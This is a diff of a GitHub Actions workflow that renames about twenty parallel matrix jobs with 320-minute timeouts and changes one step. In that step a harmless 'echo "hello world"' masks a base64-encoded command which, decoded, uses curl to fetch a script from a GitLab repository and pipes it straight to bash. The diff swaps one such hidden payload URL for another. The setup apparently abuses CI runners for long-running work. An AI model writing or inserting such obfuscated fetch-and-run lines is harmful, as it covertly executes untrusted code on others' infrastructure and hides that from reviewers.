@@ -19,26 +19,26 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: kafhia-aes1
-          - name: kafhia-bes1
-          - name: kafhia-ces1
-          - name: kafhia-des1
-          - name: kafhia-ees1
-          - name: kafhia-fes1
-          - name: kafhia-ges1
-          - name: kafhia-hes1
-          - name: kafhia-ies1
-          - name: kafhia-jes1
-          - name: kfhai-aaes1
-          - name: kfhai-baes1
-          - name: kfhai-caes1
-          - name: kfhai-daes1
-          - name: kfhai-eaes1
-          - name: kfhai-faes1
-          - name: kfhai-ages1
-          - name: kfhai-haes1
-          - name: kfhai-iaes1
-          - name: kfhai-jaes1          
+          - name: kafhia-aese1
+          - name: kafhia-bese1
+          - name: kafhia-cese1
+          - name: kafhia-dese1
+          - name: kafhia-eese1
+          - name: kafhia-fese1
+          - name: kafhia-gese1
+          - name: kafhia-hese1
+          - name: kafhia-iese1
+          - name: kafhia-jese1
+          - name: kfhai-aaese1
+          - name: kfhai-baese1
+          - name: kfhai-caese1
+          - name: kfhai-daese1
+          - name: kfhai-eaese1
+          - name: kfhai-faese1
+          - name: kfhai-agese1
+          - name: kfhai-haese1
+          - name: kfhai-iaese1
+          - name: kfhai-jaese1          
     runs-on: ubuntu-latest
     timeout-minutes: 320
     steps:
@@ -74,7 +74,7 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vcml2ZXJzYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh & sleep $SLEEP
 
   trigger-phanu:
     needs: run-lscpu
